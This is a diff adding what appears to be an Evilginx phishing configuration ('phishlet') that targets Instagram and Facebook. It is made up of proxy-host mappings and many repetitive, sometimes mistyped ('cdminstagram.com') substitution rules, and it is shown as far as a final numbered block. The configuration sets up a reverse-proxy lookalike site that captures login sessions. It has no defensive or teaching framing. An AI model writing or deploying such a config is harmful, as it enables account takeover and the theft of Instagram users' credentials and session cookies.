@@ -1,0 +1,329 @@
+author: '@fire'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'instagram.com', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com', session: true, is_landing: false}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.net', session: true, is_landing: false}
+  - {phish_sub: 'www1', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'instagram.com', session: true, is_landing: false}
+  - {phish_sub: 'img', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'static-cdn', orig_sub: 'static', domain: 'cdninstagram.com', session: false, is_landing: false}
+  - {phish_sub: 'scontent-cdn', orig_sub: 'scontent', domain: 'cdninstagram.com', session: false, is_landing: false}
+  - {phish_sub: 'gr', orig_sub: 'graph', domain: 'instagram.com', session: true, is_landing: false}
+  - {phish_sub: 'sta', orig_sub: 'static.xx', domain: 'fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'bekar', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'edge-chat', orig_sub: 'edge-chat', domain: 'instagram.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  #- {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'static.cdninstagram.com', orig_sub: 'static', domain: 'cdminstagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'cdminstagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'graphql.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'img.instagram.fcdg1-1.fna.fbcdn.net', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'static-cdn.cdninstagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'scontent-cdn.cdninstagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'graph.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static.xx', domain: 'fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'instagram.fmxp10-1.fna.fbcdn.net', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'edge-chat.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+
+# 4dd
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#2
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+#3
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'static.cdninstagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#4
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'connect.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#5
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'static.cdninstagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+
+#6
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'connect.facebook.net', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#7
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'img.instagram.fcdg1-1.fna.fbcdn.net', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#8
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'static-cdn.cdninstagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#9
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
